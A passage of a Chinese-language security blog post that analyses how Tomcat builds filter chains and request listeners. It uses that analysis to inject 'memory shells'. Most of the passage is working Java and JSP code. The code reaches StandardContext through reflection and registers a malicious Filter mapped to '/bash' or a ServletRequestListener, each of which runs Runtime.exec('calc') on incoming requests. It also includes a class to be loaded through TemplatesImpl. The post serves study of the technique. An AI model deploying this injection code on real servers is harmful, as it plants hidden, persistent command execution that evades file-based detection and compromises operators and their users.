class="line">        out.println(name);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        doGet(req,res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Filter服务</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebFilter(&quot;/web1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter1</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line"></span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始构造完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了操作&quot;</span>);</span><br><span class="line">        chain.doFilter(request,response);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter 销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面进行调试看是如何创建Filter的，java内存马的原理和python内存马的原理差不多，python是注册一个新的路由，而java可以从多处处理，这里的Filter也是一方面，在访问路由时先访问我们构造好的恶意的Filter代码，这样就可以实现内存马的作用，所以在构造前需要先搞清楚它是如何实现的</p>
<p><img src="/images/tomcat3.png" width="100%" height="80%"></p>
<p>在我们的chain中已经有了filter的身影,接下来我们就可以从这里出发往前找，先看看调用栈</p>
<p><img src="/images/tomcat4.png" width="100%" height="80%"></p>
<p><img src="/images/tomcat5.png" width="100%" height="80%"></p>
<p>下面来到ApplicationFilterChain#internalDoFilter方法里面</p>
<p>这里存在filter的创建且filter正是chain里面的，它是通过filterConfig#getFilter方法获取，一个filterConfig对应一个Filter，用于存储Filter的上下文信息，而filterConfig是从属性filters – ApplicationFilterConfig数组中获得，但是这里还不是来源，还得往前找</p>
<p>上一步就来到了StandardContextValve#invoke方法里面</p>
<p><img src="/images/tomcat6.png" width="100%" height="80%"></p>
<p>ApplicationFilterFactory#<em>createFilterChain方法很关键</em></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">        Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (request <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">        <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) request;</span><br><span class="line">        <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">            filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            filterChain = (ApplicationFilterChain) req.getFilterChain();</span><br><span class="line">            <span class="keyword">if</span> (filterChain == <span class="literal">null</span>) &#123;</span><br><span class="line">                filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">                req.setFilterChain(filterChain);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    filterChain.setServlet(servlet);</span><br><span class="line">    filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"></span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">    FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            </span><br><span class="line">        ...</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">              context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>(这里去除了无用代码)</p>
<p>方法的上半段是创建一个ApplicationFilterChain对象用来放置一个个filterConfig对象，而filterConfig对象又对应一个filter对象的信息，下面分析它是如何获取filterConfig的</p>
<p>这里它先通过wrapper.getParent();获取StandardContext对象，下面通过StandardContext#findFilterMaps获取到各Filter的信息，及下图的filterMaps</p>
<p><img src="/images/tomcat7.png" width="100%" height="80%"></p>
<p>最后就是通过遍历filterMaps通过filterMap来创建一个个filterConfig再通过filterChain.addFilter添加，这里就可以看看它是如何添加的</p>
<p><img src="/images/tomcat8.png" width="100%" height="80%"></p>
<p>这里最后放到了filters数组里面，这里和后面的创建filter相照应，可以借前面的图看看</p>
<p><img src="/images/tomcat9.png" width="100%" height="80%"></p>
<p>从这里也可以知道对于filter的调用是先创建的先被调用</p>
<p>其实到这里是从context中拿到一些属性进行操作，将filterConfig放入到FilterChain中 ，Filter内存马的思路就是，在放入FilterChain之前我们就通过反射赋值或者增加一些内容，然后tomcat就会自动的调用上面流程的代码，将恶意的filter放入filterChain,再进行调用调用其实如下图：</p>
<p><img src="/images/tomcat10.png" width="100%" height="80%"></p>
<p>总之，注入内存马是在上游的操作，而上面分析的流程在下游部分</p>
<p>由于知道一个Filter对象是通过FilterConfig对象的信息来创建，这里就可以看看FilterConfig对象有哪些信息</p>
<p><img src="/images/tomcat11.png" width="100%" height="80%"></p>
<p>这里filterConfigs包含了当前的上下文信息StandardContext、以及filterDef等信息 上下文对象StandardContext实际上是包含FilterConfigs、FilterDefs和FilterMaps了这三者的</p>
<p>这里先看看filterDef，这里存在几个主要的属性值，filter，filterClass，filterName</p>
<p><img src="/images/tomcat12.png" width="100%" height="80%"></p>
<p>然后就是context属性里面的filterConfigs与filterDefs都是HashMap类型，里面存放的信息相同</p>
<p><img src="/images/tomcat13.png" width="100%" height="80%"></p>
<p>其次是里面的filterMaps属性值里面存放的东西，以array的形式存放各filter的路径映射信息，主要的属性为filterName、urlPatterns、charset</p>
<p><img src="/images/tomcat14.png" width="100%" height="80%"></p>
<p>下面就是通过上述信息，来完成一个恶意的filter创建，具体如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">获取StandardContext对象</span><br><span class="line">创建恶意Filter</span><br><span class="line">使用FilterDef对Filter进行封装，并添加必要的属性</span><br><span class="line">创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</span><br><span class="line">使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</span><br></pre></td></tr></table></figure>
<p><strong>获取StandardContext对象</strong></p>
<p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p>
<p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取ApplicationContextFacade类</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContext类属性context为StandardContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure>
<p>恶意filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter2</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Filter 初始构造完成&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">        filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;filter 销毁&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>使用FilterDef封装**</strong>filter**</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String name=<span class="string">&quot;eval&quot;</span>;</span><br><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">Filter2</span>());</span><br><span class="line">filterDef.setFilterClass(Filter2.class.getName());</span><br><span class="line">filterDef.setFilterName(name);</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br></pre></td></tr></table></figure>
<p><strong>创建filterMap</strong></p>
<p>filterMap用于filter和路径的绑定</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMaps</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMaps.setFilterName(name);</span><br><span class="line">filterMaps.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">filterMaps.addURLPattern(<span class="string">&quot;/bash&quot;</span>);</span><br><span class="line">standardContext.addFilterMap(filterMaps);</span><br></pre></td></tr></table></figure>
<p><strong>封装filterConfig及filterDef到filterConfigs</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">filterConfigs.put(name,filterConfig);</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Filter2</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;Filter 初始构造完成&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;filter 销毁&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//获取ApplicationContextFacade类</span></span><br><span class="line">    <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//反射获取ApplicationContext类属性context为StandardContext类</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">    standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    String name=<span class="string">&quot;eval&quot;</span>;</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">Filter2</span>());</span><br><span class="line">    filterDef.setFilterClass(Filter2.class.getName());</span><br><span class="line">    filterDef.setFilterName(name);</span><br><span class="line">    standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMaps</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMaps.setFilterName(name);</span><br><span class="line">    filterMaps.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    filterMaps.addURLPattern(<span class="string">&quot;/bash&quot;</span>);</span><br><span class="line">    standardContext.addFilterMap(filterMaps);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">    filterConfigs.put(name,filterConfig);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>这里触发的条件就是先访问创建的jsp文件，如何就已经创建恶意的filter，或者直接创建一个恶意的路由，创建的方法也是一样，当然也可以注入恶意的Filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebServlet(&quot;/web1&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">web1</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> req.getSession().getServletContext();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Field appContext=servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            appContext.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContext.get(servletContext);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">            standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line">            String name=<span class="string">&quot;eval&quot;</span>;</span><br><span class="line">            <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">            filterDef.setFilter(<span class="keyword">new</span> <span class="title class_">test1</span>());</span><br><span class="line">            filterDef.setFilterClass(test1.class.getName());</span><br><span class="line">            filterDef.setFilterName(name);</span><br><span class="line">            standardContext.addFilterDef(filterDef);</span><br><span class="line"></span><br><span class="line">            <span class="type">FilterMap</span> <span class="variable">filterMaps</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">            filterMaps.setFilterName(name);</span><br><span class="line">            filterMaps.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">            filterMaps.addURLPattern(<span class="string">&quot;/bash&quot;</span>);</span><br><span class="line">            standardContext.addFilterMap(filterMaps);</span><br><span class="line"></span><br><span class="line">            <span class="type">Field</span> <span class="variable">Configs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">            Configs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) Configs.get(standardContext);</span><br><span class="line">            <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class,FilterDef.class);</span><br><span class="line">            constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext,filterDef);</span><br><span class="line">            filterConfigs.put(name,filterConfig);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doPost</span><span class="params">(HttpServletRequest req, HttpServletResponse res)</span><span class="keyword">throws</span> IOException&#123;</span><br><span class="line">        doGet(req,res);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>对于Listener型的分析和Filter型其实差不多，也是需要先知道Listener监听的创建流程，将恶意的Listener监听器创建，并且放入创建的容器即可</p>
<p>这里先介绍一下Listener的作用，它主要用来监听对象的创建、销毁、属性增删改，对于执行顺序的先后为Listener-&gt;Filter-&gt;Servlet依次执行</p>
<p>将监听的对象不同，大致可以分为下面的三类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">ServletContextListener  <span class="comment">//应用程序的启动和销毁事件</span></span><br><span class="line">HttpSessionListener  <span class="comment">//这个的触发条件为创建session会话时，或者结束时</span></span><br><span class="line">ServletRequestListener <span class="comment">//用来监听ServletRequest对象，及访问web应用时</span></span><br></pre></td></tr></table></figure>
<p>综合三种Listener监听器的触发条件，还是通过ServletRequestListener更为方便</p>
<p>下面先创建一个简单的ServletRequestListener类，来分析其创建的过程</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@WebListener(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">eval</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行了Test requestDestroyed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;执行力Test requestInitialized&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>每次刷新都会调用其requestDestroyed和requestInitialized方法</p>
<p><img src="/images/tomcat15.png" width="100%" height="80%"></p>
<p>下面通过调试来获取创建时的调用栈，如下图所见</p>
<p><img src="/images/tomcat16.png" width="100%" height="80%"></p>
<p>下面到达StandardContext#fireRequestInitEvent方法里面，开始回溯创建过程，这里看到listener是通过instance来获取，而instance是遍历instances数组，创建instances数组，instances数组是通过getApplicationEventListeners方法来获取，所以这里需要跟进getApplicationEventListeners方法来看看</p>
<p><img src="/images/tomcat17.png" width="100%" height="80%"></p>
<p>但是跟进方法中这里就是直接返回了applicationEventListenersList数组</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">    <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面就找有关applicationEventListenersList属性的东西，先是看到它是有关List类型</p>
<p><img src="/images/tomcat18.png" width="100%" height="80%"></p>
<p>添加进applicationEventListenersList集合里面是通过StandardContext#addApplicationEventListener方法，这里就找到可以注入恶意listener的方法，因为在java中Context对象是全局共享的</p>
<p><img src="/images/tomcat19.png" width="100%" height="80%"></p>
<p>下面就是获取StandardContext将恶意的listener注入，和上面注入Filter型一样，可以通过jsp，或者通过web路由来实现注入，但是这里还有其它方法来获取</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">&lt;%</span><br><span class="line">    ServletRequestListener eval=<span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>()&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;执行了Test requestDestroyed&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;恶意内存马创建成功&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">    standardContext.addApplicationEventListener(eval);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>这里需要注意一点如果通过WebappClassLoaderBase的方式来获取StandardContext就需要通过当前环境下的特定的classloader方法，不然就无法强转为WebappClassLoaderBase，在Tomcat中可以正常通过WebappClassLoaderBase获取StandardContext就需要的是Tomcat的构造器WebappClassLoader，如果是URLClassLoader将无法正常加载，所以如果我们通过TemplatesImpl来动态注册一个listener时就无法成功</p>
<p>比如先创建一个恶意的类，构造方法就是注册内存马的语句</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cmd</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">cmd</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">        ServletRequestListener eval=<span class="keyword">new</span> <span class="title class_">ServletRequestListener</span>()&#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span>&#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;执行了Test requestDestroyed&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;恶意内存马创建成功&quot;</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        standardContext.addApplicationEventListener(eval);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>创建一个web路由，如果按我们所想就应该在调用templates#getOutputProperties时，就可以加载cmd字节码并且进行实例化，从而生成恶意的listener，但是结果却没有实现</p>
